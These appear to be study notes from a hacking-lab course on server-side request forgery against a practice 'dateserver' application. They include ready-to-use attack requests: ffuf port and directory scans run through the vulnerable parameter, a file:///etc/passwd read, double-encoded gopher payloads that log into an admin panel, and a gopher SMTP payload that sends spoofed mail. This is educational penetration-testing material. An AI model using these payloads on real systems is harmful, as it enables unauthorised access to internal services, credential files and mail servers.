# What is SSRF? 
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can manipulate a web application into 
sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP 
requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access 
internal systems, bypass firewalls, and retrieve sensitive information. Below is an example of a website being 
vulnerable to `SSRF`: 

## **1. Understanding the Vulnerability**
- The web application has a feature to check appointment availability.
- It sends a request to an external URL via the `dateserver` parameter.
- This means the web server fetches data from a user-specified URL.

## **2. Confirming SSRF**
- Instead of a real dateserver URL, you enter your own system’s URL (e.g., `http://your-ip/ssrf`).
- Using **netcat (`nc -lnvp 8000`)**, you see that the server connects to your system.
- This confirms that the server is making requests to external URLs specified by users.

> The -l tag is a `listen` tag. It tells Netcat to act as a server and listen for incoming connections.
> The -v tag is a `verbose` tag. This makes Netcat more verbose, providing more output about what it's doing
> The -p tag is a `port` tag. It tells the Netcat server which port to listen on

## **3. Checking If SSRF is Blind**
- You tell the application to request its own local address (`http://127.0.0.1/index.php`).
- If the response includes the HTML of the web application, the SSRF is **not blind** (meaning you can see the response).
- Why 127.0.0.1?
  - `Self-Referencing Requests (SSRF Vulnerability)`: The core idea of testing an SSRF vulnerability is to see if the   web application will send a request to an internal resource (like 127.0.0.1) based on user input. If you provide 127.0.0.1, you are specifically targeting the server itself. This helps you confirm that the server makes internal requests and could be used to enumerate services running locally.
  - `Scanning Internal Ports`: When you provide 127.0.0.1, you're directing the server to send requests to its own internal network, which allows you to scan open ports and services running on the server. For example, ports like 3306 (MySQL) or 80 (HTTP) could be open on the server itself, and testing against 127.0.0.1 will help you identify those without needing to rely on external domain names.
  - `External Domain Names`: If you used the web server's domain name (e.g., http://example.com), you would be making a request to an external resource rather than testing the server's ability to query internal services. SSRF vulnerabilities exploit the server's ability to fetch data from internal or private resources, such as databases or internal APIs, that would not normally be accessible externally.

## **4. Exploiting SSRF for Internal Enumeration**
- Since the server makes requests internally, you can check for open ports.
- Testing a closed port (like `81`) returns an error.
- Using **ffuf**, you scan for open ports by sending requests with different port numbers and filtering out error responses.
- You can create a simple bash script to create a number list of the ports you want to scan for such as:
  ```bash
    seq 1 1000 > ports.txt
  ```
- Example results show:
  - Port **3306** (MySQL database) is open.
  - Port **80** (HTTP web server) is open.
 

# **Comprehensive Notes on Exploiting SSRF**

## **1. Understanding SSRF Exploitation**
Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to manipulate server requests, enabling them to access internal services, restricted endpoints, and even interact with other protocols like SMTP or MySQL. This guide covers **various SSRF exploitation techniques** in detail.

---

## **2. Accessing Restricted Endpoints**
### **Scenario**
- The web application fetches availability data from `dateserver.htb`.
- Direct access to `http://dateserver.htb:<PORT>/` is blocked.
- However, SSRF allows us to access this restricted domain indirectly by injecting URLs into the vulnerable `dateserver` parameter.

### **Brute-Force Directory Enumeration via SSRF**
**Objective:** Discover hidden endpoints on the restricted domain.

**Step 1: Identify the web server’s response for a non-existent page**
- Sending a request to an invalid page (e.g., `/invalid`) returns a **default Apache 404 response**.
- Apache also returns **403 errors** for restricted files.

**Step 2: Filter out 404 and 403 errors during fuzzing**
- Use `ffuf` to brute-force directories while filtering default error pages.
- Example:
  ```bash
  ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
  -fr "Server at dateserver.htb Port 80"
  ```
  **Explanation:**
  - `-w` → Specifies the wordlist for directory fuzzing.
  - `-u` → URL to test.
  - `-X POST` → Uses a POST request.
  - `-H` → Sets HTTP headers (e.g., `Content-Type`).
  - `-d` → POST data where `FUZZ` is replaced by words from the list.
  - `-fr` → Filters results containing the Apache error message.

**Discovered Endpoints:**
- `/admin.php`
- `/availability.php`

These can be accessed through SSRF for potential sensitive information.

---

## **3. Local File Inclusion (LFI) via SSRF**
### **Objective**
Use SSRF to read sensitive files on the server using the `file://` URL scheme.

### **Exploit**
```bash
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Type: application/x-www-form-urlencoded

 dateserver=file:///etc/passwd&date=2024-01-01
```

**Impact:**
- Can read system files (`/etc/passwd`, `/var/www/html/config.php`).
- May expose credentials and sensitive configurations.

---

## **4. Exploiting SSRF with the Gopher Protocol**
### **Why Use Gopher?**
- Standard `http://` URLs only allow GET requests.
- Some endpoints require POST requests (e.g., login forms).
- `gopher://` allows crafting **raw TCP requests**, bypassing this limitation.

### **Example: Logging Into an Admin Panel via Gopher SSRF**
#### **Scenario**
- `/admin.php` requires a **POST request** with a password (`adminpw=admin`).
- We cannot send POST requests via SSRF using `http://`.
- We use `gopher://` to construct a **manual HTTP request**.

#### **Manual POST Request (Before Encoding)**
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

#### **Convert to a Gopher Payload (URL Encoded)**
```bash
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

#### **Final Encoded Request (Double URL-Encoding Required)**
```bash
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

#### **Impact:**
- Successfully logs in as admin through SSRF.
- Can be used to **brute-force credentials** or **modify server settings**.

---

## **5. Using Gopher to Exploit Internal Services**
Gopher can interact with **any TCP-based service**. Example:
- **SMTP (Port 25)** → Send emails.
- **MySQL (Port 3306)** → Query internal databases.
- **Redis (Port 6379)** → Gain persistence.

### **Automating Exploit Generation with Gopherus**
Instead of manually constructing gopher payloads, use **Gopherus**:
```bash
python2.7 gopherus.py --exploit smtp
```

**Example SMTP Exploit:**
```bash
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40htb%0ARCPT%20TO:victim%40htb%0ADATA%0AFrom:attacker%40htb%0ASubject:Hacked!%0AYou%20have%20been%20pwned!%0A.
```

**Impact:**
- Send emails from the target’s mail server.
- Manipulate Redis, MySQL, and other internal services.

---

## **6. Summary of SSRF Exploitation Techniques**
| **Technique** | **Description** | **Example** |
|--------------|----------------|-------------|
| **Restricted Endpoint Access** | Use SSRF to access internal web pages. | `dateserver=http://dateserver.htb/admin.php` |
| **Directory Enumeration** | Brute-force hidden directories. | `ffuf` with `FUZZ` payload |
| **LFI via SSRF** | Read local files using `file://` | `file:///etc/passwd` |
| **Gopher for POST Requests** | Bypass GET-only SSRF limitations. | `gopher://` crafted payload |
| **Interacting with Internal Services** | Use SSRF to attack databases, mail servers, etc. | `Gopherus` tool |

---

## **7. Conclusion**
- **SSRF is a powerful attack vector** for accessing internal systems.
- **Gopher can be leveraged to escalate attacks beyond web requests.**
- **Automation tools like Gopherus help simplify complex payloads.**
- **Filtering error responses (404, 403) ensures efficient fuzzing.**

By mastering these techniques, an attacker can **pivot deeper into a target’s network**, extract sensitive data, and exploit internal services.


 

